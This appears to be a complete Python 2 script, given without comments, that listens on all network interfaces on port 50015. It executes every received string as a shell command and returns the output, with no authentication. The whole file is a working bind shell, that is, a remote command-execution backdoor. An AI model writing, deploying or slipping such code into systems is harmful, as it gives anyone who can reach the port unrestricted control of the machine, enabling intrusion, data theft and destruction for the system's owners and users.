#! /usr/bin/env python
#-*- coding: utf-8 -*-

import sys
import socket
import commands
import threading
from time import sleep

host='0.0.0.0'
port=50015

def worker(conn, addr):
    print 'Connected by', addr
    while 1:
        data = conn.recv(1024)
        cmd_status, cmd_ret = commands.getstatusoutput(data)
        if len(cmd_ret.strip()) == 0:
            conn.sendall('Done.')
        else:
            conn.sendall(cmd_ret)
    conn.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(50)
while 1:
    sleep(0.1)
    conn, addr = s.accept()
    t = threading.Thread(target=worker, args=(conn, addr))
    t.start()
